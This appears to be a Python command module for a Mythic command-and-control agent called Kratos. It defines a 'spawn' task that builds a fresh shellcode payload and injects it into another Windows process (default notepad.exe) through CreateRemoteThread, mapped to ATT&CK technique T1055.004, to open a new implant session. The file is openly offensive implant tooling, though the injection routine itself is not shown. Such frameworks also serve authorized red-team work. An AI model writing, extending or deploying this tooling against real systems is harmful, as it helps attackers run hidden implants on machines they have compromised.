import asyncio

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class SpawnArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload Kratos shellcode",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_shellcode_payloads,
                description="Kratos shellcode payload to inject into the spawnto process",
            ),
            CommandParameter(
                name="chunk_size_mb",
                cli_name="ChunkSizeMB",
                display_name="Chunk Size (MB)",
                type=ParameterType.Number,
                default_value=4,
                description="Shellcode download chunk size in MB. Larger = fewer round-trips = faster.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
        ]

    async def get_shellcode_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        result = PTRPCDynamicQueryFunctionMessageResponse(Success=True)
        search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["kratos"],
        ))
        choices = []
        if search.Success and search.Payloads:
            for p in search.Payloads:
                build_params = {bp.Name: bp.Value for bp in p.BuildParameters}
                if build_params.get("output_format") == "shellcode":
                    choices.append(f"{p.Filename} - {p.Description}")
        if not choices:
            result.Choices = ["[No Kratos shellcode payload found - build one with output_format=shellcode]"]
            return result
        result.Choices = choices
        return result

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SpawnCommand(CommandBase):
    cmd = "spawn"
    needs_admin = False
    help_cmd = "spawn (modal popup)"
    description = "Fork+Run: spawn a new Kratos session inside the spawnto process via CreateRemoteThread. Use spawnto to change the target process (default: notepad.exe)."
    version = 1
    author = "@goultarde"
    attackmapping = ["T1055", "T1055.004"]
    argument_class = SpawnArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Parse the selected choice: strip "[NN] " prefix, then split on first " - "
        raw = taskData.args.get_arg("template")
        if raw.startswith("[") and "]" in raw:
            raw = raw[raw.index("]") + 1:].strip()
        filename, _, description = raw.partition(" - ")
        filename = filename.strip()
        description = description.strip()

        # Find the template payload by filename + description
        template_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=taskData.Callback.ID,
            PayloadTypes=["kratos"],
            Filename=filename,
            Description=description,
        ))
        if not template_search.Success or not template_search.Payloads:
            raise Exception(f"Template payload not found: {filename!r} / {description!r}")

        template = template_search.Payloads[0]
        build_params = {bp.Name: bp.Value for bp in template.BuildParameters}
        if build_params.get("output_format") != "shellcode":
            raise Exception(
                f"Selected payload has output_format='{build_params.get('output_format')}' - choose a shellcode build."
            )

        # Build a fresh copy so each spawn gets a unique UUID/callback
        new_payload = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
            TaskID=taskData.Task.ID,
            PayloadUUID=template.UUID,
            NewDescription="{}'s spawned session from task {}".format(
                taskData.Task.OperatorUsername, str(taskData.Task.DisplayID)
            ),
        ))
        if not new_payload.Success:
            raise Exception("Failed to start payload build process")

        file_id = None
        while True:
            resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=new_payload.NewPayloadUUID,
            ))
            if not resp.Success:
                raise Exception(resp.Error)
            phase = resp.Payloads[0].BuildPhase
            if phase == "success":
                file_id = resp.Payloads[0].AgentFileId
                response.DisplayParams = f"spawning from '{template.Description}'"
                break
            elif phase == "error":
                raise Exception("Payload build failed")
            elif phase == "building":
                await asyncio.sleep(2)
            else:
                raise Exception(f"Unexpected build phase: {phase}")

        # Get the MD5 Mythic computed when it stored the shellcode on disk.
        # This is guaranteed to match what the agent downloads in chunks.
        file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            AgentFileID=file_id,
        ))
        if file_search.Success and file_search.Files:
            stored_md5 = file_search.Files[0].Md5
            taskData.args.add_arg("shellcode_md5", stored_md5, ParameterType.String)
            response.DisplayParams += f" | md5={stored_md5}"
        else:
            taskData.args.add_arg("shellcode_md5", "", ParameterType.String)

        chunk_size_mb = int(taskData.args.get_arg("chunk_size_mb") or 4)
        taskData.args.add_arg("sc_chunk_size", chunk_size_mb * 1024 * 1024, ParameterType.Number)
        taskData.args.add_arg("file", file_id, ParameterType.String)
        taskData.args.remove_arg("template")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
